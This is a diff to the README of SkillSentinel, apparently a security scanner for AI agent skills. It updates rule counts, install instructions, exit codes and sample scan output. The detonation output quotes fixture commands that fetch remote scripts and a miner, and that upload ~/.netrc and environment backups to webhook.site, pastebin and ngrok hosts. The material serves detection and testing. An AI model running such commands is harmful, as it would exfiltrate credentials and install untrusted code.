@@ -15,7 +15,7 @@
 [![CI](https://github.com/artemasmith/skillsentinel/actions/workflows/skillsentinel.yml/badge.svg)](https://github.com/artemasmith/skillsentinel/actions/workflows/skillsentinel.yml)
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
 [![Python 3.10+](https://img.shields.io/badge/python-3.10%2B%20%7C%203.11%20%7C%203.12%20%7C%203.13-blue.svg)](pyproject.toml)
-[![Rules](https://img.shields.io/badge/rules-39-purple.svg)](rules/rules.json)
+[![Rules](https://img.shields.io/badge/dynamic/json?url=https%3A%2F%2Fraw.githubusercontent.com%2Fartemasmith%2Fskillsentinel%2Fv0.3.0%2Frules%2Frules.json&query=%24.rules.length&label=rules&color=purple)](rules/rules.json)
 [![Dependencies](https://img.shields.io/badge/dependencies-0-success.svg)](#zero-dependencies)
 [![OWASP Agentic Top 10](https://img.shields.io/badge/mapped%20to-OWASP%20Agentic%20Top%2010-red.svg)](#what-it-detects)
 
@@ -36,7 +36,7 @@ pattern match ──► candidate ──► file-local verifier ──► findin
                           with a written reason                is traceable
 ```
 
-1. **Pattern match → candidate.** 39 rules, cheap, high recall, allowed to be noisy.
+1. **Pattern match → candidate.** 42 rules (as of v0.3.0 — `skillsentinel rules` prints the live count), cheap, high recall, allowed to be noisy.
 2. **Candidate → verdict.** A deterministic, file-local verifier confirms it (`exploitable` — e.g. a secret read in a file that also performs network egress), downgrades it (`capability` — a dual-use primitive, credible but not proof), or drops it (`low_trust`) — in that case the candidate stays visible in `--json` with its demotion reason.
 
 What the verifier actually decides on: is the line a directive to an agent, code, or prose? Is it inside a fenced code block or explicitly negated? Is a secret read corroborated by egress **in the same file**? Is a base64 blob accompanied by a decode call? Does the line merely enumerate attack signatures (a detection table) instead of issuing them? Four profiles (`--profile strict|balanced|loose|paranoid`) trade precision against recall. No LLM, no network, no hidden state.
@@ -68,13 +68,15 @@ Exit code `1` when findings meet the severity threshold — drop it straight int
 
 ## Install
 
+Not yet on PyPI (publication planned — until then install from a tagged git ref):
+
 ```bash
-pipx install skillsentinel                 # preferred: isolated CLI on your PATH
-# or straight from the git repo (works before any PyPI release):
-pip install git+https://github.com/artemasmith/skillsentinel
+pipx install "git+https://github.com/artemasmith/skillsentinel@v0.3.0"   # preferred: isolated CLI on your PATH
+# or, inside a virtualenv:
+pip install "skillsentinel @ git+https://github.com/artemasmith/skillsentinel@v0.3.0"
 ```
 
-Zero runtime dependencies (stdlib only), Python ≥ 3.10. From a checkout no install is needed at all — `python3 -m skillsentinel …` runs in place.
+`pip install --user` works too (the rules catalog is found under the user base as of 0.3.1). Zero runtime dependencies (stdlib only), Python ≥ 3.10. From a checkout no install is needed at all — `python3 -m skillsentinel …` runs in place.
 
 ## Exit codes
 
@@ -82,7 +84,7 @@ Zero runtime dependencies (stdlib only), Python ≥ 3.10. From a checkout no ins
 |------|---------|
 | 0 | clean — no confirmed findings; for `watch diff`, no drift since the snapshot |
 | 1 | at least one confirmed finding at/above the `--severity` threshold, or drift detected by `watch diff` |
-| 2 | input error: missing or unreadable path, invalid `--rules`, a whole-skill `.skillsentinelignore` pattern, `--timeout` expiry, or the `--max-files` limit |
+| 2 | input error: missing or unreadable path, invalid `--rules`, a scan that saw zero scannable files (an empty or fully excluded directory), a whole-skill `.skillsentinelignore` pattern, `--timeout` expiry, or the `--max-files` limit |
 | 3 | internal error — a bug, please report it |
 
 This is the only exit-code table in the project; `scan --help` prints the same contract.
@@ -93,7 +95,7 @@ Every error is one line on stderr, never a traceback. Two flags bound runaway tr
 
 ```console
 $ python3 -m skillsentinel scan tests/fixtures/malicious
-SkillSentinel v0.2.0 — scanned tests/fixtures/malicious (10 files, 0 skipped, profile: balanced)
+SkillSentinel v0.3.0 — scanned .../skillsentinel/tests/fixtures/malicious (10 files, 0 skipped, profile: balanced)
 Confirmed findings: 42 (critical: 27, high: 14, medium: 1, low: 0); 3 candidate(s) demoted
 
 == CRITICAL ==
@@ -116,28 +118,30 @@ Confirmed findings: 42 (critical: 27, high: 14, medium: 1, low: 0); 3 candidate(
 exit code 1
 
 $ python3 -m skillsentinel scan tests/fixtures/benign
-SkillSentinel v0.2.0 — scanned tests/fixtures/benign (6 files, 0 skipped, profile: balanced)
+SkillSentinel v0.3.0 — scanned .../skillsentinel/tests/fixtures/benign (6 files, 0 skipped, profile: balanced)
 No exploitable findings. Supply chain looks clean. ✓
 exit code 0
 
 $ python3 -m skillsentinel scan tests/fixtures/benign-hard   # lookalikes that are NOT malicious
-SkillSentinel v0.2.0 — scanned tests/fixtures/benign-hard (6 files, 0 skipped, profile: balanced)
+SkillSentinel v0.3.0 — scanned .../skillsentinel/tests/fixtures/benign-hard (6 files, 0 skipped, profile: balanced)
 No exploitable findings. Supply chain looks clean. ✓; 13 candidate(s) demoted — see --json for reasons
 exit code 0
 
 $ python3 -m skillsentinel scan tests/fixtures/malicious --detonate   # requires bubblewrap
 -- Detonation (5 scripts) --
+[ran ] tests/fixtures/malicious/03-obfuscation/helper.py  exit=1  egress: none observed
 [ran ] tests/fixtures/malicious/04-rce-download/install.sh  exit=7
-      egress: curl -fsSL https://example.com/setup.sh, wget -qO- https://x.example/x.py,
+      egress: curl -fsSL https://example.com/setup.sh, wget -qO- https://example.com/x.py,
               curl -o /tmp/agent https://example.com/agent
 [ran ] tests/fixtures/malicious/05-cred-exfil/collect.sh  exit=7
       egress: curl --upload-file /tmp/payload https://webhook.site/abc-123,
               curl -d @/tmp/env_backup https://pastebin.com/api/post,
               curl -X POST -F f=@/home/user/.netrc https://example.ngrok.io/upload
 [ran ] tests/fixtures/malicious/06-miner/run.sh  exit=127  egress: curl -sL https://example.com/xmrig.tar.gz
+[ran ] tests/fixtures/malicious/07-persistence/setup.sh  exit=1  egress: none observed
 ```
 
-(Medium/high findings trimmed for space; full output, including detonation of the obfuscation and persistence fixtures, is reproducible with the same command.)
+(Medium/high findings trimmed for space; the full output is reproducible with the same command. Paths are elided with `...` — the scanner prints the absolute path of the scanned tree.)
 
 ### Rug-pull detection
 
@@ -155,7 +159,7 @@ exit code 1
 
 ## What it detects
 
-39 rules, all mapped to the [OWASP Agentic Top 10](https://genai.owasp.org/):
+42 rules (as of v0.3.0 — `skillsentinel rules` prints the live count), all mapped to the [OWASP Agentic Top 10](https://genai.owasp.org/):
 
 | Category | Severity range | OWASP | Examples |
 |---|---|---|---|
@@ -174,7 +178,7 @@ exit code 1
 
 ## Comparison with prior art
 
-| | [SkillSpector](https://github.com/NVIDIA/SkillSpector) | [AI-Infra-Guard](https://github.com/Tencent/AI-Infra-Guard) | [agent-scan](https://github.com/snyk/cli) | [mcp-scanner](https://github.com/cisco/mcp-scanner) | **SkillSentinel** |
+| | [SkillSpector](https://github.com/NVIDIA/SkillSpector) | [AI-Infra-Guard](https://github.com/Tencent/AI-Infra-Guard) | [agent-scan](https://github.com/snyk/agent-scan) | [mcp-scanner](https://github.com/eSentire-Labs/mcp-scanner) | **SkillSentinel** |
 |---|---|---|---|---|---|
 | Static scan before install | ✅ | ✅ | ✅ | ✅ (MCP-focused) | ✅ |
 | **Drift watch after install (rug-pull)** | ❌ | ❌ | ❌ | ❌ | ✅ `watch init` / `watch diff` |
@@ -262,7 +266,7 @@ Pure Python stdlib (`re`, `json`, `hashlib`, `argparse`, `subprocess`, `pathlib`
 ## Testing & contributing
 
 ```bash
-python3 -m unittest discover -s tests -v   # 61 tests
+python3 -m unittest discover -s tests -v   # 189 tests as of v0.3.0 (the runner prints the count)
 ```
 
 Fixtures: 10 malicious skills (real attack patterns, inert payloads), 6 clean skills, and a **`benign-hard` corpus of the false positives this scanner actually produced** while being built — a fenced install command, a legit SSH backup, a detection-signature table, a systemd deploy, a script reading the user's own saved password. All three sets are asserted: every malicious directory flagged, zero findings on both benign sets, every demotion carrying a reason.
